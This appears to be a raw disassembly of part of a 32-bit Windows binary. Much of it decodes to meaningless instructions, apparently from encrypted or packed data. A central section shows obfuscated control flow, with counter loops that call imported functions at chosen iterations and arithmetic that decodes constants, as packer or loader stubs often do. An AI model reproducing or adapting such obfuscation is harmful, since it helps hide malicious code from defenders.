  411ad5:	mov    BYTE PTR [eax+eiz*4],al
  411ad8:	mov    dh,0x63
  411ada:	(bad)  
  411adb:	jne    0x411b0f
  411add:	xor    BYTE PTR [edx+0x1365f68e],dh
  411ae3:	push   es
  411ae4:	fcomp  QWORD PTR [ebx+0x38]
  411ae7:	push   edi
  411ae8:	or     bl,BYTE PTR [ebx-0x50d6ffdb]
  411aee:	call   0x87c7:0x7719e001
  411af5:	mov    eax,ds:0xb982e35
  411afa:	mov    ah,0x2
  411afc:	sahf   
  411afd:	test   al,0x84
  411aff:	dec    edi
  411b00:	jnp    0x411b5f
  411b02:	clc    
  411b03:	mov    esi,0x6645562d
  411b08:	mov    ch,0x72
  411b0a:	icebp  
  411b0b:	xchg   ebx,eax
  411b0c:	sbb    BYTE PTR [esp+eax*4],dh
  411b0f:	mov    eax,0x420f18bb
  411b14:	clc    
  411b15:	out    0xce,eax
  411b17:	mov    ch,0x55
  411b19:	push   esp
  411b1a:	xor    ebp,0xffffff88
  411b1d:	scas   eax,DWORD PTR es:[edi]
  411b1e:	sub    BYTE PTR [ebp-0x4d],cl
  411b21:	inc    esi
  411b22:	push   ecx
  411b23:	cmp    al,0xd7
  411b25:	lds    esi,FWORD PTR [ecx-0x6c3762a9]
  411b2b:	ret    
  411b2c:	loope  0x411b2e
  411b2e:	je     0x411b19
  411b30:	mov    ebp,0x26ecff27
  411b35:	mov    esp,0xbeea9573
  411b3a:	inc    esi
  411b3b:	retf   
  411b3c:	push   ebp
  411b3d:	mov    ebp,0x1041babb
  411b42:	rol    BYTE PTR [edx+edi*4],cl
  411b45:	cmp    cl,BYTE PTR [ecx+eax*8]
  411b48:	cmc    
  411b49:	add    BYTE PTR [ebx+0x24],bl
  411b4c:	and    bl,BYTE PTR [esi-0x3]
  411b4f:	push   ds
  411b50:	mov    al,0x5a
  411b52:	test   al,0x73
  411b54:	fnstsw WORD PTR [eax+0x400c50e5]
  411b5a:	or     dh,bl
  411b5c:	adc    ebp,ecx
  411b5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b5f:	enter  0xd855,0x6a
  411b63:	sbb    dh,0x37
  411b66:	scas   al,BYTE PTR es:[edi]
  411b67:	cli    
  411b68:	out    0xca,eax
  411b6a:	add    DWORD PTR [edx+0x69],edx
  411b6d:	xchg   edi,eax
  411b6e:	lea    ebx,[esi]
  411b70:	push   cs
  411b71:	lds    eax,FWORD PTR [eax-0x70d45e2a]
  411b77:	test   DWORD PTR [ebx-0x4],ecx
  411b7a:	test   eax,0x9c3ee736
  411b7f:	rol    BYTE PTR [esi],cl
  411b81:	ror    cl,cl
  411b83:	and    dh,BYTE PTR [edi]
  411b85:	xor    dh,BYTE PTR [ecx+edx*1-0x3b]
  411b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b8a:	jns    0x411b11
  411b8c:	mov    dh,0xde
  411b8e:	xor    al,0xd7
  411b90:	mov    ebp,0xcfe2dc0a
  411b95:	in     al,dx
  411b96:	sbb    ebx,esi
  411b98:	push   esp
  411b99:	adc    BYTE PTR [edi],ch
  411b9b:	jp     0x411bc5
  411b9d:	inc    ebp
  411b9e:	rcl    DWORD PTR [ebp-0x785dc36c],1
  411ba4:	test   eax,0xb949d924
  411ba9:	fwait
  411baa:	jne    0x411c0e
  411bac:	pop    ds
  411bad:	push   edx
  411bae:	mov    ebp,0xc7b0dd70
  411bb3:	rcr    eax,0x65
  411bb6:	jns    0x411b59
  411bb8:	cs retf 0x7b28
  411bbc:	pop    ds
  411bbd:	jle    0x411c1f
  411bbf:	push   ds
  411bc0:	stc    
  411bc1:	imul   edi
  411bc3:	lahf   
  411bc4:	shl    DWORD PTR [ebp-0x16ddc9f8],0xae
  411bcb:	and    BYTE PTR [ecx+0x625b477b],0x25
  411bd2:	daa    
  411bd3:	inc    ecx
  411bd4:	adc    esi,ecx
  411bd6:	sbb    al,0x83
  411bd8:	das    
  411bd9:	mov    bh,0x1d
  411bdb:	lock mov esi,0xa6015fb3
  411be1:	mov    ds:0x2aeceb9a,eax
  411be6:	aas    
  411be7:	mov    ds:0x74248c2b,al
  411bec:	iret   
  411bed:	(bad)  [ebx]
  411bef:	popa   
  411bf0:	push   cs
  411bf1:	adc    al,0x9b
  411bf3:	xor    DWORD PTR [ebx+0x62],0x392846db
  411bfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bfb:	das    
  411bfc:	pop    edi
  411bfd:	fs ret 0xaf05
  411c01:	bswap  esp
  411c03:	jne    0x411b8c
  411c05:	lock or ecx,DWORD PTR [esi+0x2690027a]
  411c0c:	dec    BYTE PTR [ebp-0x64b6478e]
  411c12:	fisub  WORD PTR [eax]
  411c14:	gs dec edi
  411c16:	pop    ebp
  411c17:	mov    ds:0x3d569d32,eax
  411c1c:	(bad)  
  411c1d:	dec    esi
  411c1e:	je     0x411c44
  411c20:	dec    ecx
  411c21:	pop    ebx
  411c22:	es inc edx
  411c24:	push   eax
  411c25:	mov    eax,0x8a588a5b
  411c2a:	lods   eax,DWORD PTR ds:[esi]
  411c2b:	or     DWORD PTR [eax-0xf92749c],ecx
  411c31:	push   es
  411c32:	(bad)  
  411c34:	mov    al,ds:0x1909f311
  411c39:	lds    eax,FWORD PTR [ebp-0x39]
  411c3c:	in     al,dx
  411c3d:	lods   al,BYTE PTR ds:[esi]
  411c3e:	and    al,0x32
  411c40:	xchg   esi,eax
  411c41:	nop
  411c42:	add    eax,0x62f865ed
  411c47:	and    esp,DWORD PTR [ebp-0x1f]
  411c4a:	mov    dh,0x42
  411c4c:	mov    esp,0x9947bf25
  411c51:	xchg   esp,eax
  411c52:	pop    ebx
  411c53:	aad    0xfa
  411c55:	test   al,0xc0
  411c57:	leave  
  411c58:	lea    esp,[eax-0x1a064a74]
  411c5e:	xchg   DWORD PTR [eax-0x9],edx
  411c61:	loopne 0x411c26
  411c63:	mov    ch,0x16
  411c65:	dec    edx
  411c66:	leave  
  411c67:	scas   eax,DWORD PTR es:[edi]
  411c68:	imul   esi,DWORD PTR [ebp+0x2e],0xffffffa1
  411c6c:	sbb    eax,0x65630048
  411c71:	sbb    bl,BYTE PTR [ebx-0x1e243666]
  411c77:	arpl   WORD PTR [ebp+0x1c96bf2f],di
  411c7d:	ret    
  411c7e:	(bad)  
  411c7f:	xlat   BYTE PTR ds:[ebx]
  411c80:	fisub  DWORD PTR [edx+0x4]
  411c83:	aaa    
  411c84:	iret   
  411c85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c87:	test   DWORD PTR [ebx],ebp
  411c89:	hlt    
  411c8a:	dec    edi
  411c8b:	call   0x57ac26a1
  411c90:	stc    
  411c91:	sbb    edi,DWORD PTR [edx]
  411c93:	adc    DWORD PTR [esi-0x6f],ebp
  411c96:	pusha  
  411c97:	loop   0x411d0f
  411c99:	and    BYTE PTR [eax-0x50],dh
  411c9c:	pop    eax
  411c9d:	dec    eax
  411c9e:	out    0x5c,eax
  411ca0:	mov    esp,0x94e3ee3c
  411ca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ca6:	cmp    DWORD PTR [edx],esp
  411ca8:	jns    0x411c52
  411caa:	xchg   edi,eax
  411cab:	sbb    ah,BYTE PTR [ebx+ebp*8]
  411cae:	sbb    edi,DWORD PTR ds:0x3522b9af
  411cb4:	scas   eax,DWORD PTR es:[edi]
  411cb5:	adc    edx,DWORD PTR [ebx+0x71]
  411cb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cb9:	adc    ah,cl
  411cbb:	adc    al,0x50
  411cbd:	dec    BYTE PTR [ecx+edi*2+0x4f]
  411cc1:	push   ebx
  411cc2:	jno    0x411d12
  411cc4:	mov    BYTE PTR [edx-0x2f532919],bl
  411cca:	sub    al,0xf5
  411ccc:	addps  xmm6,XMMWORD PTR [edx+ebx*4]
  411cd0:	ins    DWORD PTR es:[edi],dx
  411cd1:	cs clc 
  411cd3:	and    al,0x3a
  411cd5:	add    ecx,DWORD PTR [edi]
  411cd7:	mov    dh,0x6e
  411cd9:	jbe    0x411cbf
  411cdb:	jl     0x411d3f
  411cdd:	pop    esp
  411cde:	xchg   ebx,eax
  411cdf:	sbb    eax,0x25cfd7f7
  411ce4:	test   ecx,edi
  411ce6:	cwde   
  411ce7:	mov    fs,WORD PTR [ebp+ebx*1-0x9]
  411ceb:	jb     0x411d36
  411ced:	enter  0x55e6,0x28
  411cf1:	xchg   ecx,eax
  411cf2:	adc    al,BYTE PTR [ebp-0x60]
  411cf5:	aaa    
  411cf6:	mov    ah,0x3a
  411cf8:	shl    BYTE PTR [edi+0x25],0xbb
  411cfc:	xchg   esi,eax
  411cfd:	cmc    
  411cfe:	pop    edi
  411cff:	rcl    BYTE PTR [edi+0x4a],cl
  411d02:	mov    dl,0xa6
  411d04:	in     al,dx
  411d05:	jmp    0x411d32
  411d07:	sub    DWORD PTR [edi+0x79e61b24],ecx
  411d0d:	cmp    BYTE PTR [esi+0x6c],bl
  411d10:	sbb    ebx,DWORD PTR [ebx-0x529281ec]
  411d16:	hlt    
  411d17:	mov    WORD PTR [edi-0x408f07cb],fs
  411d1d:	sub    eax,0x5ef21eea
  411d22:	xchg   ecx,eax
  411d23:	pop    esi
  411d24:	retf   0x9626
  411d27:	sar    BYTE PTR [edx+0x57],cl
  411d2a:	pop    esp
  411d2b:	adc    al,0x15
  411d2d:	sti    
  411d2e:	in     al,0x89
  411d30:	idiv   DWORD PTR [edi]
  411d32:	push   cs
  411d33:	sbb    eax,0xa0d9eab1
  411d38:	adc    DWORD PTR [ebp+0x3f],0xffffff95
  411d3c:	sub    cl,BYTE PTR fs:[ecx]
  411d3f:	mov    ebx,0xc76e03c1
  411d44:	mov    edi,0x1ae75b8c
  411d49:	jl     0x411cf7
  411d4b:	popf   
  411d4c:	loope  0x411dc9
  411d4e:	dec    edx
  411d4f:	in     eax,0x32
  411d51:	stos   BYTE PTR es:[edi],al
  411d52:	into   
  411d53:	or     al,0xd2
  411d55:	cmp    al,0x3
  411d57:	xchg   esp,eax
  411d58:	xchg   ebp,eax
  411d59:	xor    al,0x8f
  411d5b:	xchg   esp,eax
  411d5c:	add    DWORD PTR [ebp+0x76fa1602],0xe2ad528c
  411d66:	fcmovnu st,st(3)
  411d68:	inc    ebx
  411d69:	mov    eax,0x75871a40
  411d6e:	test   dl,0xd3
  411d71:	(bad)  
  411d72:	cmp    BYTE PTR [ecx],bl
  411d74:	(bad)
  411d77:	add    ebp,DWORD PTR [esi]
  411d79:	inc    edx
  411d7a:	enter  0x45a9,0x7f
  411d7e:	mov    edx,0xcc64ffc3
  411d83:	hlt    
  411d84:	adc    BYTE PTR [ebx],dh
  411d86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d87:	scas   eax,DWORD PTR es:[edi]
  411d88:	mov    edi,0xae9a371f
  411d8d:	dec    edx
  411d8e:	repz sub al,0xe
  411d91:	loopne 0x411d17
  411d93:	fistp  WORD PTR [ecx-0x42]
  411d96:	nop
  411d97:	mov    ah,0x6a
  411d99:	mov    dl,0x72
  411d9b:	rcl    DWORD PTR [eax-0x3106aa56],1
  411da1:	int    0xe6
  411da3:	sub    DWORD PTR [ebx+0x6c819d29],ebx
  411da9:	stos   BYTE PTR es:[edi],al
  411daa:	pop    ecx
  411dab:	jo     0x411e0b
  411dad:	sahf   
  411dae:	adc    al,0x27
  411db0:	push   0x7ad4f08
  411db5:	xchg   ebp,eax
  411db6:	jbe    0x411de1
  411db8:	mov    ds:0x1a582e10,al
  411dbd:	jne    0x411db7
  411dbf:	add    al,0xd3
  411dc1:	mov    edx,0x73265c19
  411dc6:	dec    edi
  411dc7:	mov    edi,0x52db8eee
  411dcc:	adc    ebx,DWORD PTR [ebx+edx*8-0x41f425a0]
  411dd3:	xor    DWORD PTR [eax+0x1d2902a3],ebx
  411dd9:	ds test al,0x1f
  411ddc:	outs   dx,DWORD PTR ds:[esi]
  411ddd:	sub    ecx,edx
  411ddf:	mov    eax,0x1a59c982
  411de4:	pop    esp
  411de5:	inc    ebx
  411de6:	mov    ebx,edi
  411de8:	or     eax,0x74c204a6
  411ded:	ret    0x8d1
  411df0:	shr    DWORD PTR [edi+edx*2],cl
  411df3:	or     eax,0x595dbdb8
  411df8:	push   ss
  411df9:	jne    0x411e3d
  411dfb:	dec    esi
  411dfc:	xchg   edi,eax
  411dfd:	ja     0x411df2
  411dff:	dec    edi
  411e00:	das    
  411e01:	cdq    
  411e02:	pop    eax
  411e03:	loope  0x411de3
  411e05:	xchg   DWORD PTR [edx+edx*8+0x25fcb2db],ebp
  411e0c:	cs or  eax,0xd42ae418
  411e12:	in     al,0xbd
  411e14:	(bad)  
  411e15:	retf   
  411e16:	jne    0x411dc3
  411e18:	add    eax,0xd7fe991d
  411e1d:	sub    DWORD PTR [edx-0x42],esi
  411e20:	mov    al,0xd3
  411e22:	cmp    eax,0x199caf85
  411e27:	fwait
  411e28:	inc    eax
  411e29:	data16 test al,0x8c
  411e2c:	cli    
  411e2d:	jae    0x411e76
  411e2f:	xor    ecx,DWORD PTR [ebx+0x68]
  411e32:	pushf  
  411e33:	dec    esi
  411e34:	scas   eax,DWORD PTR es:[edi]
  411e35:	rol    BYTE PTR [edi+0x20d68abc],1
  411e3b:	pop    ds
  411e3c:	repnz (bad) 
  411e3f:	arpl   WORD PTR [esi-0x55d02c60],cx
  411e45:	bound  esp,QWORD PTR [edx-0x6c]
  411e48:	int3   
  411e49:	dec    eax
  411e4a:	cmp    ch,BYTE PTR [eax+0x70]
  411e4d:	pop    DWORD PTR [ebx-0x2cc4ff0a]
  411e53:	jne    0x411e75
  411e59:	mov    DWORD PTR ds:0x42900c,0x30b0
  411e63:	cmp    esi,edi
  411e65:	mov    DWORD PTR ds:0x42d000,0x643
  411e6f:	je     0x411edc
  411e75:	sub    edx,0x6beb
  411e7b:	mov    edx,DWORD PTR ds:0x424020
  411e81:	mov    edx,DWORD PTR [edx+0x1c0]
  411e87:	mov    edx,DWORD PTR [edx]
  411e89:	sub    DWORD PTR ds:0x42c018,0x42901c
  411e93:	xor    esi,esi
  411e95:	add    edx,ecx
  411e97:	adc    esi,0xffffffff
  411e9a:	xor    edx,eax
  411e9c:	and    DWORD PTR ds:0x42d010,0x4e39
  411ea6:	xor    esi,0x0
  411ea9:	mov    DWORD PTR ds:0x42a018,0x6a83
  411eb3:	cmp    edx,0x70941fd1
  411eb9:	mov    DWORD PTR ds:0x42d014,0x6414
  411ec3:	jne    0x411f46
  411ec9:	mov    DWORD PTR ds:0x42b000,0x2399
  411ed3:	cmp    esi,0xffffffff
  411ed6:	jne    0x411f46
  411edc:	mov    edx,DWORD PTR ds:0x4240a4
  411ee2:	mov    esi,DWORD PTR ds:0x42409c
  411ee8:	xor    edx,esi
  411eea:	mov    DWORD PTR ds:0x42409c,edx
  411ef0:	mov    edx,DWORD PTR [ebp+0xc]
  411ef3:	mov    edx,DWORD PTR [edx]
  411ef5:	mov    edx,DWORD PTR [edx]
  411ef7:	mov    esi,DWORD PTR ds:0x42409c
  411efd:	add    DWORD PTR [edx],esi
  411eff:	mov    esi,DWORD PTR [ebp+0x8]
  411f02:	mov    edx,DWORD PTR ds:0x42409c
  411f08:	xor    esi,0x7510893
  411f0e:	add    esi,0x3272db
  411f14:	xor    ebx,ebx
  411f16:	add    esi,ecx
  411f18:	adc    ebx,0xffffffff
  411f1b:	xor    edi,edi
  411f1d:	xor    esi,eax
  411f1f:	xor    ebx,0x0
  411f22:	add    edx,ecx
  411f24:	adc    edi,0xffffffff
  411f27:	xor    edx,eax
  411f29:	xor    edi,0x0
  411f2c:	cmp    edx,esi
  411f2e:	jne    0x411f46
  411f34:	cmp    edi,ebx
  411f36:	jne    0x411f46
  411f3c:	mov    eax,ds:0x42409c
  411f41:	mov    ds:0x4240a4,eax
  411f46:	pop    edi
  411f47:	pop    esi
  411f48:	pop    ebx
  411f49:	pop    ebp
  411f4a:	ret    0x8
  411f4d:	push   ebp
  411f4e:	mov    ebp,esp
  411f50:	sub    esp,0x90
  411f56:	add    DWORD PTR ds:0x42a01c,0x734d
  411f60:	push   esi
  411f61:	xor    ecx,0xb67
  411f67:	push   edi
  411f68:	xor    eax,DWORD PTR ds:0x42a018
  411f6e:	mov    eax,ds:0x424020
  411f73:	add    esi,0x4c8c
  411f79:	mov    DWORD PTR [ebp-0x2c],eax
  411f7c:	xor    ecx,0x3033
  411f82:	mov    eax,ds:0x42412c
  411f87:	and    DWORD PTR ds:0x42a010,0x0
  411f91:	mov    esi,DWORD PTR ds:0x42a010
  411f97:	inc    esi
  411f98:	mov    DWORD PTR ds:0x42a010,esi
  411f9e:	cmp    DWORD PTR ds:0x42a010,0xd
  411fa5:	jne    0x411fbe
  411fab:	push   0x1106
  411fb0:	push   DWORD PTR [ebp-0xc]
  411fb3:	push   0x571c
  411fb8:	call   DWORD PTR ds:0x425044
  411fbe:	cmp    DWORD PTR ds:0x42a010,0xc
  411fc5:	jne    0x411fda
  411fcb:	xor    esi,esi
  411fcd:	add    esi,DWORD PTR ds:0x42a010
  411fd3:	inc    esi
  411fd4:	mov    DWORD PTR ds:0x42a010,esi
  411fda:	cmp    DWORD PTR ds:0x42a010,0x14
  411fe1:	jb     0x411f91
  411fe7:	mov    DWORD PTR [ebp-0x3c],eax
  411fea:	and    DWORD PTR ds:0x42b004,edx
  411ff0:	and    DWORD PTR [ebp-0x34],0x0
  411ff4:	xor    ecx,DWORD PTR ds:0x42d010
  411ffa:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  412001:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  412008:	and    edi,DWORD PTR ds:0x42b018
  41200e:	mov    eax,DWORD PTR [ebp-0x1c]
  412011:	mov    ecx,DWORD PTR [ebp-0x1c]
  412014:	xor    edi,DWORD PTR ds:0x42b004
  41201a:	xor    eax,ecx
  41201c:	add    DWORD PTR ds:0x429018,ecx
  412022:	mov    DWORD PTR [ebp-0x1c],eax
  412025:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  41202c:	sub    ecx,esi
  41202e:	mov    eax,DWORD PTR [ebp-0x28]
  412031:	mov    DWORD PTR ds:0x42a010,0x1d
  41203b:	cmp    DWORD PTR ds:0x42a010,0x0
  412042:	je     0x4120a2
  412048:	cmp    DWORD PTR ds:0x42a010,0x4
  41204f:	jne    0x412069
  412055:	push   DWORD PTR [ebp-0x1c]
  412058:	push   0x61a2
  41205d:	push   DWORD PTR [ebp-0x1c]
  412060:	push   DWORD PTR [ebp-0x18]
  412063:	call   DWORD PTR ds:0x425048
  412069:	cmp    DWORD PTR ds:0x42a010,0x5
  412070:	jne    0x412083
  412076:	mov    ecx,DWORD PTR ds:0x42a010
  41207c:	dec    ecx
  41207d:	mov    DWORD PTR ds:0x42a010,ecx
  412083:	mov    ecx,DWORD PTR ds:0x42a010
  412089:	dec    ecx
  41208a:	mov    DWORD PTR ds:0x42a010,ecx
  412090:	jmp    0x41203b
  412095:	movzx  esi,BYTE PTR ds:0x42b010
  41209c:	sub    DWORD PTR ds:0x42c008,esi
  4120a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4120a5:	sub    edi,esi
  4120a7:	xor    eax,ecx
  4120a9:	mov    DWORD PTR [ebp-0x28],eax
  4120ac:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4120b3:	and    DWORD PTR ds:0x42b000,0x0
  4120bd:	mov    eax,ds:0x42b000
  4120c2:	inc    eax
  4120c3:	mov    ds:0x42b000,eax
  4120c8:	cmp    DWORD PTR ds:0x42b000,0x1d
  4120cf:	jne    0x4120de
  4120d5:	push   DWORD PTR [ebp-0x10]
  4120d8:	call   DWORD PTR ds:0x42504c
  4120de:	cmp    DWORD PTR ds:0x42b000,0x16
  4120e5:	jb     0x4120bd
  4120eb:	mov    DWORD PTR ds:0x429018,0x1a
  4120f5:	cmp    DWORD PTR ds:0x429018,0x0
  4120fc:	je     0x412149
  412102:	cmp    DWORD PTR ds:0x429018,0x9
  412109:	jne    0x41211d
  41210f:	push   DWORD PTR [ebp-0x10]
  412112:	push   0x4244d0
  412117:	call   DWORD PTR ds:0x425010
  41211d:	cmp    DWORD PTR ds:0x429018,0xa
  412124:	jne    0x412137
  41212a:	mov    ecx,DWORD PTR ds:0x429018
  412130:	dec    ecx
  412131:	mov    DWORD PTR ds:0x429018,ecx
  412137:	mov    ecx,DWORD PTR ds:0x429018
  41213d:	dec    ecx
  41213e:	mov    DWORD PTR ds:0x429018,ecx
  412144:	jmp    0x4120f5
  412149:	mov    eax,DWORD PTR [ebp-0x18]
  41214c:	adc    ecx,esi
  41214e:	mov    ecx,DWORD PTR [ebp-0x18]
  412151:	xor    eax,ecx
  412153:	xor    esi,esi
  412155:	xor    esi,DWORD PTR ds:0x429028
  41215b:	sbb    DWORD PTR ds:0x429014,esi
  412161:	mov    DWORD PTR [ebp-0x18],eax
  412164:	mov    ecx,DWORD PTR ds:0x423e2c
  41216a:	mov    eax,ds:0x42438f
  41216f:	sub    ecx,eax
  412171:	imul   ecx,DWORD PTR [ecx+eax*1]
  412175:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  41217c:	mov    DWORD PTR ds:0x42a018,0x18
  412186:	cmp    DWORD PTR ds:0x42a018,0x0
  41218d:	je     0x4121c0
  412193:	cmp    DWORD PTR ds:0x42a018,0x1b
  41219a:	jne    0x4121ac
  4121a0:	push   DWORD PTR [ebp-0x1c]
  4121a3:	push   DWORD PTR [ebp-0x18]
  4121a6:	call   DWORD PTR ds:0x425018
  4121ac:	xor    esi,esi
  4121ae:	or     esi,DWORD PTR ds:0x42a018
  4121b4:	dec    esi
  4121b5:	mov    DWORD PTR ds:0x42a018,esi
  4121bb:	jmp    0x412186
  4121c0:	mov    eax,DWORD PTR [ebp-0x24]
  4121c3:	or     DWORD PTR ds:0x429014,0x2eb5
  4121cd:	mov    ecx,DWORD PTR [ebp-0x24]
  4121d0:	mov    DWORD PTR ds:0x429000,0x1b
  4121da:	cmp    DWORD PTR ds:0x429000,0x0
  4121e1:	je     0x412218
  4121e7:	cmp    DWORD PTR ds:0x429000,0x2a
  4121ee:	jne    0x412206
  4121f4:	push   0x42901c
  4121f9:	push   0x0
  4121fb:	push   0x4243be
  412200:	call   DWORD PTR ds:0x42501c
  412206:	mov    esi,DWORD PTR ds:0x429000
  41220c:	dec    esi
  41220d:	mov    DWORD PTR ds:0x429000,esi
  412213:	jmp    0x4121da
  412218:	xor    eax,ecx
  41221a:	mov    DWORD PTR [ebp-0x24],eax
  41221d:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  412224:	sbb    eax,DWORD PTR ds:0x429004
  41222a:	mov    eax,DWORD PTR [ebp-0x14]
  41222d:	sub    DWORD PTR ds:0x429018,ecx
  412233:	mov    ecx,DWORD PTR [ebp-0x14]
  412236:	and    DWORD PTR ds:0x42d014,0x19f0
  412240:	xor    eax,ecx
  412242:	mov    DWORD PTR [ebp-0x14],eax
  412245:	mov    eax,DWORD PTR [ebp-0x20]
  412248:	mov    ecx,DWORD PTR [ebp-0x14]
  41224b:	dec    esi
  41224c:	mov    esi,0x7510893
  412251:	and    DWORD PTR ds:0x42a01c,0x5143
  41225b:	xor    eax,esi
  41225d:	and    DWORD PTR ds:0x42a004,0x0
  412267:	jmp    0x41227b
  41226c:	xor    edi,edi
  41226e:	add    edi,DWORD PTR ds:0x42a004
  412274:	inc    edi
  412275:	mov    DWORD PTR ds:0x42a004,edi
  41227b:	cmp    DWORD PTR ds:0x42a004,0x15
  412282:	jae    0x4122c2
  412288:	cmp    DWORD PTR ds:0x42a004,0x5
  41228f:	jne    0x4122a3
  412295:	push   0x42c018
  41229a:	push   DWORD PTR [ebp-0x24]
  41229d:	call   DWORD PTR ds:0x425020
  4122a3:	cmp    DWORD PTR ds:0x42a004,0x4
  4122aa:	jne    0x4122bd
  4122b0:	mov    edi,DWORD PTR ds:0x42a004
  4122b6:	inc    edi
  4122b7:	mov    DWORD PTR ds:0x42a004,edi
  4122bd:	jmp    0x41226c
  4122c2:	mov    edi,0x3272db
  4122c7:	add    eax,edi
  4122c9:	xor    eax,ecx
  4122cb:	mov    DWORD PTR [ebp-0x14],eax
  4122ce:	mov    eax,DWORD PTR [ebp-0x10]
  4122d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4122d4:	sub    eax,ecx
  4122d6:	mov    DWORD PTR [ebp-0x10],eax
  4122d9:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4122e0:	mov    al,BYTE PTR [ebp-0x1]
  4122e3:	movzx  ecx,BYTE PTR [ebp-0x1]
  4122e7:	movzx  eax,al
  4122ea:	sub    ecx,eax
  4122ec:	mov    BYTE PTR [ebp-0x1],cl
  4122ef:	movzx  eax,BYTE PTR [ebp-0x1]
  4122f3:	xor    eax,0xffffff99
  4122f6:	mov    BYTE PTR [ebp-0x1],al
  4122f9:	mov    eax,DWORD PTR [ebp-0x20]
  4122fc:	xor    eax,esi
  4122fe:	add    eax,edi
  412300:	mov    DWORD PTR [ebp-0x14],eax
  412303:	lea    eax,[ebp-0x40]
  412306:	mov    DWORD PTR [ebp-0x38],eax
  412309:	lea    eax,[ebp-0x38]
  41230c:	mov    DWORD PTR [ebp-0x44],eax
  41230f:	lea    eax,[ebp-0x44]
  412312:	mov    DWORD PTR [ebp-0x8],eax
  412315:	lea    eax,[ebp-0x8]
  412318:	mov    DWORD PTR [ebp-0x48],eax
  41231b:	mov    eax,DWORD PTR [ebp-0x18]
  41231e:	jmp    0x41466d
  412323:	test   cl,dl
  412325:	icebp  
  412326:	arpl   WORD PTR gs:[ebp+0x64],sp
  41232a:	scas   eax,DWORD PTR es:[edi]
  41232b:	push   0xbcf94cc8
  412330:	and    al,0xd6
  412332:	cwde   
  412333:	fisubr WORD PTR [ebx+0x62]
  412336:	bound  edx,QWORD PTR [eax+0x5f]
  412339:	bound  esp,QWORD PTR [edx-0x3d]
  41233c:	mov    dl,0x56
  41233e:	xlat   BYTE PTR ds:[ebx]
  41233f:	lods   eax,DWORD PTR ds:[esi]
  412340:	loopne 0x412346
  412342:	les    esp,FWORD PTR [ebx+0x59]
  412345:	mov    ebp,DWORD PTR [ecx]
  412347:	dec    edi
  412348:	xor    edx,esp
  41234a:	fdivr  DWORD PTR ds:0x9d7e8aeb
  412350:	xor    eax,DWORD PTR [ebx-0x5f654f55]
  412356:	or     al,dh
  412358:	out    0xc8,al
  41235a:	ins    DWORD PTR es:[edi],dx
  41235b:	mov    ds:0xda008bba,eax
  412360:	out    dx,al
  412361:	in     al,0x37
  412363:	dec    DWORD PTR [edi+0x50db70c5]
  412369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41236a:	sub    eax,0xb6f03214
  41236f:	into   
  412370:	sub    BYTE PTR [edx],0xe7
  412373:	xor    eax,0x1c12c37e
  412378:	call   0x3e0384f2
  41237d:	sahf   
  41237e:	inc    ebx
  41237f:	pop    esi
  412380:	cld    
  412381:	and    bl,bh
  412383:	or     BYTE PTR [ecx],dh
  412385:	call   FWORD PTR [edi+0x2f]
  412388:	es push ebx
  41238a:	dec    ecx
  41238b:	xchg   esi,eax
  41238c:	lds    eax,FWORD PTR [esi-0x1a4f06c6]
  412392:	cmp    al,0x17
  412394:	push   ss
  412395:	icebp  
  412396:	push   cs
  412397:	into   
  412398:	jno    0x412340
  41239a:	repnz imul eax,DWORD PTR [ebx+esi*4],0x5f2d8f47
  4123a2:	sti    
  4123a3:	sbb    eax,0x2ff8d822
  4123a8:	popa   
  4123a9:	or     al,BYTE PTR [edi+ebx*1-0x40]
  4123ad:	test   eax,0x1a18980f
  4123b2:	jmp    0x1eb6:0xdf532f99
  4123b9:	enter  0x521a,0xdf
  4123bd:	mov    dl,0xda
  4123bf:	mov    dh,0x3f
  4123c1:	mov    esp,0x81dbbf53
  4123c6:	adc    DWORD PTR [ebp+0x55],ebp
  4123c9:	stos   DWORD PTR es:[edi],eax
  4123ca:	outs   dx,BYTE PTR ds:[esi]
  4123cb:	jp     0x4123af
  4123cd:	pop    eax
  4123ce:	inc    ebp
  4123cf:	mov    ebx,0xbdd96e7f
  4123d4:	mov    esi,0x10e88e83
  4123d9:	jle    0x41244d
  4123db:	loop   0x4123f4
  4123dd:	mov    ds:0x21f364ca,eax
  4123e2:	shr    BYTE PTR [ebx],0xbf
  4123e5:	loope  0x4123f2
  4123e7:	mov    eax,0x5aa96ab0
  4123ec:	pop    ebx
  4123ed:	(bad)  [esi-0x7304b245]
  4123f3:	nop
  4123f4:	mov    DWORD PTR [ebx],edx
  4123f6:	jns    0x4123fc
  4123f8:	sbb    dl,ah
  4123fa:	inc    ebp
  4123fb:	pusha  
  4123fc:	out    dx,eax
  4123fd:	and    eax,0x93ef5050
  412402:	outs   dx,BYTE PTR ds:[esi]
  412403:	dec    ebp
  412404:	lods   al,BYTE PTR ds:[esi]
  412405:	ror    DWORD PTR [ebx+0x11],0x5e
  412409:	xchg   ecx,eax
  41240a:	dec    ebx
  41240b:	test   DWORD PTR [ecx-0x14dcd4e5],ebx
  412411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412412:	dec    esp
  412413:	mov    dl,BYTE PTR [edi-0x36]
  412416:	push   eax
  412417:	es push ebp
  412419:	jae    0x412439
  41241b:	seto   BYTE PTR [ecx]
  41241e:	xchg   esi,eax
  41241f:	adc    BYTE PTR [eax],cl
  412421:	retf   
  412422:	xchg   esp,eax
  412423:	sbb    cl,ah
  412425:	daa    
  412426:	loope  0x412455
  412428:	dec    ecx
  412429:	add    al,0xf7
  41242b:	add    edi,ebp
  41242d:	adc    ebx,DWORD PTR [eax+0x6b2273ef]
  412433:	push   ebp
